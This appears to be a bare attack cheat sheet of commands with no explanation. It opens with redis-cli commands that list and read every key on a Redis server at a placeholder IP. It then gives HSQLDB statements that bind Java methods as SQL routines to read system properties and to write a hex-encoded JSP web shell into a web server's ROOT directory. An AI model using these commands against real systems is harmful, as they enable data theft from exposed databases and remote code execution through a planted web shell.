redis-cli -h {IP} SELECT 1
redis-cli -h {IP} KEYS *
redis-cli -h {IP} GET {KEY}

redis-cli -h {IP} TYPE {KEY}
redis-cli -h {IP} LRANGE {KEY} 0 -1
redis-cli -h {IP} HGET {KEY} {FIELD}

CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';
VALUES(getsystemproperty('user.name'));

CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e...' AS VARBINARY(1024)));
